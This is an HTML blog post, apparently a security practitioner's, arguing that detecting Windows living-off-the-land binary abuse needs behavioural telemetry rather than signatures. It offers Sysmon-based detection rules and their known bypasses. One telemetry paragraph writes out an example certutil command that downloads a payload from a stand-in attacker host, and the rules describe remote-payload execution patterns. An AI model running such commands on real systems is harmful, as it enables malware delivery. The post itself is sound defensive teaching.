@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>LOLBAS Detection Is an Architecture Problem: Garet P.</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display&family=DM+Sans:wght@300;400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { min-height: 100%; }
+
+    :root {
+      --bg:        #0a0a0f;
+      --surface:   #11111a;
+      --surface2:  #18182a;
+      --border:    rgba(180,140,255,0.12);
+      --border-hi: rgba(180,140,255,0.45);
+      --glow:      rgba(142,107,255,0.18);
+      --accent:    #a78bfa;
+      --accent2:   #7dd3fc;
+      --text:      #e8e8f0;
+      --muted:     #8888a8;
+      --radius:    10px;
+      --font-head: 'DM Serif Display', Georgia, serif;
+      --font-body: 'DM Sans', sans-serif;
+      --font-mono: 'JetBrains Mono', monospace;
+    }
+
+    body {
+      background:
+        radial-gradient(ellipse at 85% 95%, rgba(76,29,149,0.35) 0%, transparent 55%),
+        radial-gradient(ellipse at 5% 0%,  rgba(125,211,252,0.08) 0%, transparent 45%),
+        var(--bg);
+      font-family: var(--font-body);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.035'/%3E%3C/svg%3E");
+      pointer-events: none;
+      z-index: 9999;
+      opacity: 0.6;
+    }
+
+    a { color: inherit; text-decoration: none; }
+
+    #progress-bar {
+      position: fixed;
+      top: 0; left: 0;
+      height: 2px; width: 0%;
+      background: linear-gradient(90deg, var(--accent), var(--accent2));
+      z-index: 200;
+      transition: width 0.1s linear;
+    }
+
+    .top-bar {
+      position: sticky;
+      top: 0; z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 1.1rem 3rem;
+      background: rgba(10,10,15,0.85);
+      backdrop-filter: blur(14px);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .top-bar-left { display: flex; align-items: center; gap: 1.25rem; }
+
+    .top-avatar {
+      width: 34px; height: 34px;
+      border-radius: 50%;
+      border: 1.5px solid var(--border-hi);
+      background: var(--surface2);
+      display: flex; align-items: center; justify-content: center;
+      font-family: var(--font-head);
+      font-size: 0.85rem; color: var(--accent);
+      box-shadow: 0 0 12px var(--glow);
+      flex-shrink: 0;
+    }
+
+    .top-divider { width: 1px; height: 18px; background: var(--border); }
+
+    .top-blog-link {
+      font-family: var(--font-mono);
+      font-size: 0.7rem; letter-spacing: 0.1em;
+      text-transform: uppercase; color: var(--muted);
+      transition: color 0.2s;
+    }
+    .top-blog-link:hover { color: var(--accent); }
+
+    .back-link {
+      display: inline-flex; align-items: center; gap: 0.45rem;
+      font-family: var(--font-mono);
+      font-size: 0.68rem; letter-spacing: 0.1em;
+      text-transform: uppercase; color: var(--muted);
+      padding: 0.38rem 0.85rem;
+      border: 1px solid var(--border); border-radius: 6px;
+      transition: color 0.2s, border-color 0.2s;
+    }
+    .back-link:hover { color: var(--accent); border-color: var(--accent); }
+    .back-link svg { transition: transform 0.2s; }
+    .back-link:hover svg { transform: translateX(-2px); }
+
+    .article-wrap {
+      max-width: 740px;
+      margin: 0 auto;
+      padding: 3.5rem 2rem 6rem;
+      animation: fadeUp 0.5s ease both;
+    }
+
+    .post-header { margin-bottom: 2.25rem; }
+
+    .post-meta {
+      display: flex; align-items: center; gap: 0.65rem;
+      flex-wrap: wrap; margin-bottom: 1.1rem;
+    }
+
+    .post-tag {
+      display: inline-block;
+      font-family: var(--font-mono);
+      font-size: 0.63rem; letter-spacing: 0.1em;
+      text-transform: uppercase; color: var(--accent);
+      background: rgba(167,139,250,0.1);
+      border: 1px solid rgba(167,139,250,0.2);
+      border-radius: 4px; padding: 0.18rem 0.55rem;
+    }
+
+    .post-date, .post-read-time {
+      font-family: var(--font-mono);
+      font-size: 0.68rem; color: var(--muted);
+    }
+
+    .post-header h1 {
+      font-family: var(--font-head);
+      font-size: clamp(1.8rem, 4vw, 2.75rem);
+      font-weight: 400; color: var(--text);
+      line-height: 1.2; margin-bottom: 1.1rem;
+    }
+
+    .post-lead {
+      font-size: 1.05rem; color: var(--muted);
+      line-height: 1.72;
+      border-left: 3px solid var(--accent);
+      padding-left: 1.25rem;
+    }
+
+    .post-divider {
+      width: 100%; height: 1px;
+      background: var(--border); margin: 2rem 0;
+    }
+
+    .post-body { display: flex; flex-direction: column; gap: 1.5rem; }
+
+    .post-body p { font-size: 0.97rem; color: var(--muted); line-height: 1.82; }
+
+    .post-body h2 {
+      font-family: var(--font-head);
+      font-size: 1.55rem; font-weight: 400; color: var(--text);
+      margin-top: 1rem; padding-bottom: 0.6rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .post-body h3 {
+      font-family: var(--font-head);
+      font-size: 1.15rem; font-weight: 400; color: var(--text);
+      margin-top: 0.25rem;
+    }
+
+    .post-body strong { color: var(--text); font-weight: 500; }
+
+    .post-body a {
+      color: var(--accent);
+      border-bottom: 1px solid rgba(167,139,250,0.3);
+      transition: border-color 0.2s;
+    }
+    .post-body a:hover { border-color: var(--accent); }
+
+    .post-body ul, .post-body ol {
+      padding-left: 1.5rem;
+      display: flex; flex-direction: column; gap: 0.6rem;
+    }
+
+    .post-body li { font-size: 0.97rem; color: var(--muted); line-height: 1.75; }
+    .post-body li strong { color: var(--text); }
+
+    .post-body code {
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: 4px; padding: 0.15rem 0.45rem;
+      color: var(--accent2);
+    }
+
+    .post-body pre {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.25rem 1.5rem;
+      overflow-x: auto;
+      font-family: var(--font-mono);
+      font-size: 0.82rem; color: var(--text); line-height: 1.65;
+    }
+    .post-body pre code { background: none; border: none; padding: 0; color: inherit; }
+
+    .pull-quote {
+      border-left: 3px solid var(--accent);
+      padding: 1rem 1.5rem;
+      background: rgba(167,139,250,0.05);
+      border-radius: 0 var(--radius) var(--radius) 0;
+      font-family: var(--font-head);
+      font-size: 1.15rem; color: var(--text);
+      line-height: 1.6; font-style: italic;
+    }
+
+    .callout {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 1.25rem 1.5rem;
+      display: flex; flex-direction: column; gap: 0.5rem;
+    }
+    .callout-label {
+      font-family: var(--font-mono);
+      font-size: 0.63rem; letter-spacing: 0.12em;
+      text-transform: uppercase; color: var(--accent);
+    }
+    .callout p { font-size: 0.9rem !important; line-height: 1.7 !important; }
+
+    /* LOLBAS binary table */
+    .binary-table {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      overflow: hidden;
+      width: 100%;
+    }
+
+    .binary-row {
+      display: grid;
+      grid-template-columns: 1.2fr 2fr 1fr;
+      border-bottom: 1px solid var(--border);
+    }
+    .binary-row:last-child { border-bottom: none; }
+
+    .binary-row.header {
+      background: var(--surface2);
+    }
+
+    .binary-cell {
+      padding: 0.8rem 1rem;
+      font-size: 0.85rem;
+      color: var(--muted);
+      border-right: 1px solid var(--border);
+      line-height: 1.5;
+    }
+    .binary-cell:last-child { border-right: none; }
+
+    .binary-row.header .binary-cell {
+      font-family: var(--font-mono);
+      font-size: 0.62rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--accent);
+    }
+
+    .binary-name {
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      color: var(--accent2);
+    }
+
+    .mitre-ref {
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      color: var(--muted);
+    }
+
+    /* Detection rules */
+    .rule-list { display: flex; flex-direction: column; gap: 1rem; }
+
+    .rule-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      overflow: hidden;
+      transition: border-color 0.2s;
+    }
+    .rule-card:hover { border-color: var(--border-hi); }
+
+    .rule-header {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      padding: 0.9rem 1.25rem;
+      background: var(--surface2);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .rule-num {
+      font-family: var(--font-mono);
+      font-size: 0.65rem;
+      letter-spacing: 0.1em;
+      color: var(--accent);
+    }
+
+    .rule-title {
+      font-size: 0.92rem;
+      color: var(--text);
+      font-weight: 500;
+    }
+
+    .rule-body { padding: 1rem 1.25rem; display: flex; flex-direction: column; gap: 0.75rem; }
+
+    .rule-label {
+      font-family: var(--font-mono);
+      font-size: 0.62rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin-bottom: 0.15rem;
+    }
+
+    .rule-body p { font-size: 0.87rem !important; line-height: 1.65 !important; }
+
+    .rule-body pre {
+      font-size: 0.78rem;
+      padding: 0.85rem 1rem;
+      margin: 0;
+    }
+
+    .rule-bypass {
+      background: rgba(251,191,36,0.05);
+      border: 1px solid rgba(251,191,36,0.2);
+      border-radius: 6px;
+      padding: 0.65rem 0.9rem;
+    }
+    .rule-bypass .rule-label { color: #fbbf24; }
+    .rule-bypass p { font-size: 0.84rem !important; color: var(--muted); }
+
+    /* Telemetry layers */
+    .telemetry-list { display: flex; flex-direction: column; gap: 0.75rem; }
+
+    .telemetry-item {
+      display: flex; gap: 1rem;
+      padding: 1rem 1.25rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      align-items: flex-start;
+      transition: border-color 0.2s;
+    }
+    .telemetry-item:hover { border-color: var(--border-hi); }
+
+    .telemetry-layer {
+      font-family: var(--font-mono);
+      font-size: 0.65rem;
+      letter-spacing: 0.08em;
+      color: var(--accent);
+      flex-shrink: 0;
+      padding-top: 0.1rem;
+      min-width: 2.5rem;
+    }
+
+    .telemetry-content h4 { font-size: 0.9rem; color: var(--text); margin-bottom: 0.3rem; font-weight: 500; }
+    .telemetry-content p { font-size: 0.84rem !important; color: var(--muted); line-height: 1.65 !important; }
+
+    .section-eyebrow {
+      font-family: var(--font-mono);
+      font-size: 0.63rem; letter-spacing: 0.14em;
+      text-transform: uppercase; color: var(--accent);
+      margin-bottom: -0.75rem;
+    }
+
+    .post-footer {
+      margin-top: 4rem; padding-top: 2rem;
+      border-top: 1px solid var(--border);
+      display: flex; align-items: center;
+      justify-content: space-between; flex-wrap: wrap; gap: 1rem;
+    }
+
+    .post-footer-author { display: flex; align-items: center; gap: 0.85rem; }
+
+    .footer-avatar {
+      width: 42px; height: 42px; border-radius: 50%;
+      border: 1.5px solid var(--border-hi);
+      background: var(--surface2);
+      display: flex; align-items: center; justify-content: center;
+      font-family: var(--font-head); font-size: 1rem; color: var(--accent);
+      flex-shrink: 0;
+    }
+
+    .footer-author-name { font-family: var(--font-head); font-size: 1rem; color: var(--text); }
+    .footer-author-role {
+      font-family: var(--font-mono); font-size: 0.65rem;
+      color: var(--muted); letter-spacing: 0.06em;
+      text-transform: uppercase; margin-top: 0.15rem;
+    }
+
+    .back-to-blog {
+      display: inline-flex; align-items: center; gap: 0.45rem;
+      font-family: var(--font-mono); font-size: 0.7rem;
+      letter-spacing: 0.08em; text-transform: uppercase; color: var(--muted);
+      padding: 0.5rem 1rem;
+      border: 1px solid var(--border); border-radius: 6px;
+      transition: color 0.2s, border-color 0.2s;
+    }
+    .back-to-blog:hover { color: var(--accent); border-color: var(--accent); }
+    .back-to-blog svg { transition: transform 0.2s; }
+    .back-to-blog:hover svg { transform: translateX(-2px); }
+
+    .related { margin-top: 2.5rem; padding-top: 2rem; border-top: 1px solid var(--border); }
+    .related-label { font-family: var(--font-mono); font-size: 0.63rem; letter-spacing: 0.14em; text-transform: uppercase; color: var(--muted); margin-bottom: 1rem; }
+    .related-links { display: flex; flex-direction: column; gap: 0.6rem; }
+    .related-link { display: flex; align-items: center; gap: 0.6rem; font-size: 0.88rem; color: var(--muted); transition: color 0.2s; }
+    .related-link:hover { color: var(--accent); }
+    .related-link svg { flex-shrink: 0; transition: transform 0.2s; }
+    .related-link:hover svg { transform: translateX(3px); }
+
+    ::-webkit-scrollbar { width: 3px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: rgba(180,140,255,0.15); border-radius: 3px; }
+    ::-webkit-scrollbar-thumb:hover { background: rgba(180,140,255,0.3); }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(16px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+
+  <div id="progress-bar"></div>
+
+  <header class="top-bar">
+    <div class="top-bar-left">
+      <img class="top-avatar" src="../../src/avatar.jpg" alt="Garet P."/>
+      <div class="top-divider"></div>
+      <a href="../index.html" class="top-blog-link">Blog</a>
+    </div>
+    <a href="../../index.html" class="back-link">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+      Hub
+    </a>
+  </header>
+
+  <main class="article-wrap">
+
+    <div class="post-header">
+      <div class="post-meta">
+        <span class="post-tag">Detection</span>
+        <span class="post-tag">SOC</span>
+        <span class="post-date">May 2026</span>
+        <span class="post-read-time">· 18 min read</span>
+      </div>
+      <h1>LOLBAS Detection Is an Architecture Problem, Not a Signature Gap</h1>
+      <p class="post-lead">The binary is signed by Microsoft. The process is legitimate. The parent is expected. Your EDR just watched a full intrusion chain execute and flagged nothing, because every tool used ships with Windows.</p>
+    </div>
+
+    <div class="post-divider"></div>
+
+    <div class="post-body">
+
+      <p class="section-eyebrow">// introduction</p>
+      <h2>Why LOLBAS Is a Detection Architecture Problem</h2>
+
+      <p>LOLBAS, Living Off the Land Binaries, Scripts, and Libraries, refers to attacker use of OS-native and pre-installed tooling to execute malicious activity while blending into legitimate administrative behavior. APT29 used <code>mshta.exe</code>, <code>rundll32.exe</code>, and <code>wmic.exe</code> extensively across their documented campaigns. The Lazarus Group has LOLBAS usage cataloged across multiple financial sector intrusions. These are not edge cases, they are the operational standard for sophisticated actors precisely because they defeat the most common detection layers simultaneously.</p>
+
+      <p>The core problem is structural: signature-based and hash-based detection is architecturally useless against LOLBAS. The binary is legitimate. The hash is known-good. The vendor certificate is valid. This is not a gap that better signatures can close, it is a fundamental limitation of the detection model. Signature detection assumes the malicious artifact is distinct from the benign artifact. LOLBAS eliminates that distinction entirely. The artifact is benign. Only the context is malicious.</p>
+
+      <p>Why LOLBAS adoption keeps accelerating: EDR maturity has made traditional malware deployment expensive. A custom implant requires development time, evasion investment, and generates hashes and network indicators that threat intelligence will eventually burn. LOLBAS requires none of that. The tooling is already on the endpoint, already trusted, and already generating traffic that blends with legitimate administrative noise.</p>
+
+      <div class="callout">
+        <span class="callout-label">Scope</span>
+        <p>This post covers Windows-native LOLBAS with cloud control plane parallels in the final section. The methodology is EDR and SIEM agnostic; specific examples reference Sysmon Event IDs as the canonical telemetry reference.</p>
+      </div>
+
+      <p class="section-eyebrow">// foundation</p>
+      <h2>Why Signature Detection Fails: the Structural Argument</h2>
+
+      <p>Signature detection models: hash matching, YARA rules against file content, AV vendor signatures, EDR known-bad heuristics, all operate on the artifact, not the behavior. LOLBAS defeats each layer for a distinct reason:</p>
+
+      <ul>
+        <li><strong>Hash matching:</strong> <code>certutil.exe</code>, <code>mshta.exe</code>, <code>wmic.exe</code> are Microsoft-signed. Their hashes are permanently allowlisted in virtually every enterprise environment.</li>
+        <li><strong>YARA on file content:</strong> the binary is unmodified, there is nothing malicious to match in the file itself.</li>
+        <li><strong>Behavioral signatures for known-bad process chains:</strong> work for documented specific patterns, fail the moment the attacker varies the chain by one hop or one parameter.</li>
+        <li><strong>Vendor threat intelligence:</strong> attacker use of native binaries generates no IOCs, no malicious hash, no C2 domain embedded in the binary, no network indicator attributable to the tool itself.</li>
+      </ul>
+
+      <div class="pull-quote">
+        "Signature detection asks: Is this artifact known-bad? Behavioral detection asks: Is this behavior consistent with legitimate use in this context? The second question requires far more data, far more environmental knowledge, and it is the only question LOLBAS forces you to answer."
+      </div>
+
+      <p class="section-eyebrow">// technical</p>
+      <h2>The LOLBAS Attack Surface: a Practitioner Taxonomy</h2>
+
+      <p>Not every native binary is equally exploitable. The attack surface concentrates in binaries with capabilities attackers specifically need: execution, download, encoding, lateral movement, and discovery. The LOLBAS project catalogs 150+ binaries, but the operationally important detection set is the 15–20 that appear repeatedly in real intrusion chains.</p>
+
+      <div class="binary-table">
+        <div class="binary-row header">
+          <div class="binary-cell">Binary</div>
+          <div class="binary-cell">Attacker capability</div>
+          <div class="binary-cell">MITRE ref</div>
+        </div>
+        <div class="binary-row">
+          <div class="binary-cell"><span class="binary-name">certutil.exe</span></div>
+          <div class="binary-cell">Decode Base64, download files, install certificates, a downloader and decoder in one legitimate binary</div>
+          <div class="binary-cell"><span class="mitre-ref">T1140 · T1105</span></div>
+        </div>
+        <div class="binary-row">
+          <div class="binary-cell"><span class="binary-name">mshta.exe</span></div>
+          <div class="binary-cell">Execute HTA files and inline VBScript/JScript, a full script execution engine delivered with Windows</div>
+          <div class="binary-cell"><span class="mitre-ref">T1218.005</span></div>
+        </div>
+        <div class="binary-row">
+          <div class="binary-cell"><span class="binary-name">rundll32.exe</span></div>
+          <div class="binary-cell">Execute DLL exports, proxy shellcode loading, bypass application control via legitimate execution context</div>
+          <div class="binary-cell"><span class="mitre-ref">T1218.011</span></div>
+        </div>
+        <div class="binary-row">
+          <div class="binary-cell"><span class="binary-name">regsvr32.exe</span></div>
+          <div class="binary-cell">Register COM objects, and execute arbitrary script via scrobj.dll, bypassing AppLocker and constrained language mode</div>
+          <div class="binary-cell"><span class="mitre-ref">T1218.010</span></div>
+        </div>
+        <div class="binary-row">
+          <div class="binary-cell"><span class="binary-name">wmic.exe</span></div>
+          <div class="binary-cell">Remote process execution, local discovery, WMI subscription persistencem, full remote administration capability</div>
+          <div class="binary-cell"><span class="mitre-ref">T1047 · T1546.003</span></div>
+        </div>
+        <div class="binary-row">
+          <div class="binary-cell"><span class="binary-name">msiexec.exe</span></div>
+          <div class="binary-cell">Execute remote MSI packages over HTTP, a legitimate software installer that fetches and runs arbitrary payloads</div>
+          <div class="binary-cell"><span class="mitre-ref">T1218.007</span></div>
+        </div>
+        <div class="binary-row">
+          <div class="binary-cell"><span class="binary-name">bitsadmin</span></div>
+          <div class="binary-cell">Background file transfer, persistent, low-noise download mechanism with built-in OS scheduling</div>
+          <div class="binary-cell"><span class="mitre-ref">T1197</span></div>
+        </div>
+        <div class="binary-row">
+          <div class="binary-cell"><span class="binary-name">powershell.exe</span></div>
+          <div class="binary-cell">Encoded commands, AMSI bypass, .NET reflection, in-memory execution, and remote download, the canonical LOLBAS</div>
+          <div class="binary-cell"><span class="mitre-ref">T1059.001</span></div>
+        </div>
+      </div>
+
+      <p class="section-eyebrow">// technical</p>
+      <h2>What Telemetry Behavioral Detection Actually Requires</h2>
+
+      <p>The telemetry hierarchy below is not a wish list, it is the minimum required to build detection that isn't trivially bypassed. Each layer adds capability the layer below cannot provide.</p>
+
+      <div class="telemetry-list">
+        <div class="telemetry-item">
+          <span class="telemetry-layer">L1</span>
+          <div class="telemetry-content">
+            <h4>Process creation events: Sysmon Event ID 1</h4>
+            <p>Minimum required fields: process name, <strong>full command line</strong>, parent process name, parent command line, user context, integrity level, image path, process GUID. The command line field is non-negotiable, <code>certutil.exe</code> run by an admin is normal; <code>certutil.exe -urlcache -split -f http://attacker.com/payload.exe</code> is not. Many SIEM pipelines strip or truncate command line arguments at ingestion to reduce storage cost, destroying the primary detection signal for LOLBAS entirely.</p>
+          </div>
+        </div>
+        <div class="telemetry-item">
+          <span class="telemetry-layer">L2</span>
+          <div class="telemetry-content">
+            <h4>Process access events: Sysmon Event ID 10</h4>
+            <p>Detects when one process opens a handle to another, essential for catching <code>rundll32</code> and <code>mshta</code> used as injection proxies. High noise source: legitimate software generates enormous process access volumes and requires aggressive filtering before ingestion.</p>
+          </div>
+        </div>
+        <div class="telemetry-item">
+          <span class="telemetry-layer">L3</span>
+          <div class="telemetry-content">
+            <h4>Network connection events: Sysmon Event ID 3 + DNS (Event ID 22)</h4>
+            <p>Correlates process identity to network activity, catches <code>certutil.exe</code>, <code>msiexec.exe</code>, and <code>bitsadmin</code> making outbound connections. Native Windows binaries initiating outbound connections to non-Microsoft infrastructure is anomalous in almost every legitimate context. DNS query logging adds resolution-before-connection context that IP-only logging misses.</p>
+          </div>
+        </div>
+        <div class="telemetry-item">
+          <span class="telemetry-layer">L4</span>
+          <div class="telemetry-content">
+            <h4>Image load events: Sysmon Event ID 7</h4>
+            <p>Records DLL loads by process, essential for detecting <code>scrobj.dll</code> loading via <code>regsvr32</code> or anomalous .NET assembly loading via PowerShell reflection. Extremely high volume, most deployments filter to unsigned or specific DLL names only.</p>
+          </div>
+        </div>
+        <div class="telemetry-item">
+          <span class="telemetry-layer">L5</span>
+          <div class="telemetry-content">
+            <h4>PowerShell script block logging: Windows Event ID 4104</h4>
+            <p>Captures the actual script content <strong>after deobfuscation</strong>, the single most valuable telemetry source for PowerShell-based LOLBAS. Must be enabled via Group Policy, it is off by default and frequently missing in enterprise deployments. AMSI telemetry captures script content before execution including encoded and obfuscated payloads after runtime deobfuscation.</p>
+          </div>
+        </div>
+        <div class="telemetry-item">
+          <span class="telemetry-layer">L6</span>
+          <div class="telemetry-content">
+            <h4>WMI activity logging: Sysmon Event IDs 19, 20, 21</h4>
+            <p>WMI filter, consumer, and binding creation events, the only reliable telemetry for WMI-based persistence and lateral movement. Frequently absent: WMI event logging is not enabled in default Windows configurations and is missing from many Sysmon deployments.</p>
+          </div>
+        </div>
+      </div>
+
+      <p class="section-eyebrow">// technical</p>
+      <h2>The Parent-Child Relationship: Primary Signal and Its Limits</h2>
+
+      <p>Parent-child process relationships are the most commonly used behavioral signal for LOLBAS detection, and increasingly unreliable as attackers adapt. <code>winword.exe</code> spawning <code>powershell.exe</code> is a classic detection. Legitimate Word does not do this. A malicious macro does. But this detection model has well-documented bypasses:</p>
+
+      <ul>
+        <li><strong>Parent process spoofing (T1134.004):</strong> Windows allows a process to specify an arbitrary parent via <code>STARTUPINFOEX</code>, the spawned process appears in the event log with a trusted parent even if it doesn't have one.</li>
+        <li><strong>Indirect execution:</strong> inject into an already-running legitimate process, execution occurs within a trusted process context with no parent-child anomaly to detect.</li>
+        <li><strong>LOLBin chains:</strong> use one native binary to invoke another, distributing the chain across multiple expected parent-child relationships, each individually unremarkable.</li>
+      </ul>
+
+      <p>Parent-child detection is necessary but not sufficient. It catches opportunistic and commodity attackers. It fails against targeted adversaries who understand the detection model. What is required beyond it: command line analysis, network correlation, behavioral baselines per binary per user, and multi-event sequencing.</p>
+
+      <p class="section-eyebrow">// detection rules</p>
+      <h2>Five High-Value Detection Rules with Rationale</h2>
+
+      <p>Each rule below includes the known bypass, not as a caveat but as a signal that no single rule is sufficient. The detection model requires multiple overlapping signals.</p>
+
+      <div class="rule-list">
+
+        <div class="rule-card">
+          <div class="rule-header">
+            <span class="rule-num">Rule 01</span>
+            <span class="rule-title">certutil.exe network activity</span>
+          </div>
+          <div class="rule-body">
+            <div>
+              <div class="rule-label">Logic</div>
+              <pre><code>Sysmon EID 3
+  Image: "*\\certutil.exe"
+  DestinationIp: NOT IN microsoft_cert_infrastructure_ranges</code></pre>
+            </div>
+            <div>
+              <div class="rule-label">Rationale</div>
+              <p>certutil has no legitimate reason to connect to non-Microsoft infrastructure in standard enterprise use. High-fidelity, false positive rate is very low in managed environments.</p>
+            </div>
+            <div class="rule-bypass">
+              <div class="rule-label">Known bypass</div>
+              <p>Attacker uses <code>-urlcache</code> to download from a Microsoft-hosted domain (Azure Blob, GitHub). Rule requires extension to monitor destination domain reputation, not just IP ranges.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="rule-card">
+          <div class="rule-header">
+            <span class="rule-num">Rule 02</span>
+            <span class="rule-title">Encoded PowerShell command execution</span>
+          </div>
+          <div class="rule-body">
+            <div>
+              <div class="rule-label">Logic</div>
+              <pre><code>Sysmon EID 1
+  Image: "*\\powershell.exe"
+  CommandLine: CONTAINS "-EncodedCommand" OR "-enc"
+  ParentImage: NOT IN approved_management_tooling</code></pre>
+            </div>
+            <div>
+              <div class="rule-label">Rationale</div>
+              <p>Legitimate automation rarely requires encoded commands. Encoding is primarily used to obscure malicious content from command line logging.</p>
+            </div>
+            <div class="rule-bypass">
+              <div class="rule-label">Known bypass</div>
+              <p>Script block logging (EID 4104) captures decoded content, supplement with script block content analysis for coverage against encoding variations.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="rule-card">
+          <div class="rule-header">
+            <span class="rule-num">Rule 03</span>
+            <span class="rule-title">mshta.exe executing remote content</span>
+          </div>
+          <div class="rule-body">
+            <div>
+              <div class="rule-label">Logic</div>
+              <pre><code>Sysmon EID 1
+  Image: "*\\mshta.exe"
+  CommandLine: CONTAINS "http" OR "https"</code></pre>
+            </div>
+            <div>
+              <div class="rule-label">Rationale</div>
+              <p>mshta executing local HTA files has legitimate use cases. mshta fetching and executing remote content has effectively none in managed enterprise environments.</p>
+            </div>
+            <div class="rule-bypass">
+              <div class="rule-label">Known bypass</div>
+              <p>Attacker hosts payload on an internal compromised server. Rule requires network reputation context for complete coverage against internal staging.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="rule-card">
+          <div class="rule-header">
+            <span class="rule-num">Rule 04</span>
+            <span class="rule-title">Regsvr32 scriptlet execution (Squiblydoo)</span>
+          </div>
+          <div class="rule-body">
+            <div>
+              <div class="rule-label">Logic</div>
+              <pre><code>Sysmon EID 1
+  Image: "*\\regsvr32.exe"
+  CommandLine: CONTAINS "/s" AND "/u" AND "http"</code></pre>
+            </div>
+            <div>
+              <div class="rule-label">Rationale</div>
+              <p>regsvr32 with a remote scriptlet URL is a documented AppLocker bypass with no legitimate administrative use case. This specific combination has an extremely low false positive rate in managed environments.</p>
+            </div>
+            <div class="rule-bypass">
+              <div class="rule-label">Known bypass</div>
+              <p>Variation in parameter ordering or use of short flags. The core indicator, remote URL in regsvr32 command line, remains consistent and should be the primary matching criterion.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="rule-card">
+          <div class="rule-header">
+            <span class="rule-num">Rule 05</span>
+            <span class="rule-title">wmic.exe spawning shell interpreters</span>
+          </div>
+          <div class="rule-body">
+            <div>
+              <div class="rule-label">Logic</div>
+              <pre><code>Sysmon EID 1
+  ParentImage: "*\\wmic.exe"
+  Image: "*\\cmd.exe" OR "*\\powershell.exe" OR "*\\cscript.exe"</code></pre>
+            </div>
+            <div>
+              <div class="rule-label">Rationale</div>
+              <p>wmic spawning a shell interpreter is a lateral movement and execution pattern. Legitimate wmic usage for inventory queries does not spawn child processes.</p>
+            </div>
+            <div class="rule-bypass">
+              <div class="rule-label">Known bypass</div>
+              <p>Parent process spoofing. Supplement with WMI event consumer telemetry (Sysmon EIDs 19–21) for persistence-specific coverage that bypasses process tree inspection.</p>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+      <p class="section-eyebrow">// remediation</p>
+      <h2>What a Mature LOLBAS Detection Program Looks Like</h2>
+
+      <p>The gap in most LOLBAS detection programs is not the rules, it is the telemetry the rules depend on that was never collected, the baselines that were never built, and the reduction work that was never done to make the signal tractable.</p>
+
+      <h3>Non-negotiable telemetry requirements</h3>
+      <ul>
+        <li>Full command line arguments preserved end-to-end from endpoint to SIEM, no truncation at any pipeline stage</li>
+        <li>PowerShell script block logging enabled via GPO across all endpoints</li>
+        <li>WMI event consumer logging enabled (Sysmon EIDs 19–21)</li>
+        <li>DNS query logging correlated to process identity</li>
+        <li>Network connections correlated to process identity, not just firewall logs without process context</li>
+      </ul>
+
+      <h3>Reduction work before detection is possible</h3>
+      <ul>
+        <li>Audit which LOLBAS binaries have zero legitimate use in your environment and block or alert-on-any-use them</li>
+        <li>Enforce PowerShell Constrained Language Mode for non-administrative users, blocks the most dangerous capabilities without requiring a full baseline model</li>
+        <li>Remove or disable <code>mshta.exe</code>, <code>wscript.exe</code>, <code>cscript.exe</code> from endpoints where they have no legitimate use</li>
+      </ul>
+
+      <p class="section-eyebrow">// conclusion</p>
+      <h2>Behavioral Detection Is an Infrastructure Investment</h2>
+
+      <div class="pull-quote">
+        "Writing a LOLBAS detection rule takes thirty minutes. Building the telemetry infrastructure that makes it reliable takes months. Most teams have done the first and skipped the second."
+      </div>
+
+      <p>The gap is not the rules. Rules are cheap. The gap is the telemetry pipeline those rules depend on, the command line fields that got stripped at ingestion, the script block logging that was never enabled via GPO, the WMI event IDs that were never added to the Sysmon config.</p>
+
+      <p>The closing question worth running right now: if you executed an Atomic Red Team test for <code>mshta.exe</code> fetching a remote payload in your environment, would your detection fire? If you do not know the answer with confidence, that is the gap. The rule may exist. The question is whether the infrastructure beneath it works.</p>
+
+      <div class="callout">
+        <span class="callout-label">Key references</span>
+        <p>LOLBAS Project (lolbas-project.github.io); Atomic Red Team (atomicredteam.io), test IDs for each binary covered; MITRE ATT&CK T1218 sub-techniques; SwiftOnSecurity sysmon-config as reference Sysmon baseline; Palantir Alerting and Detection Strategy framework.</p>
+      </div>
+
+    </div>
+
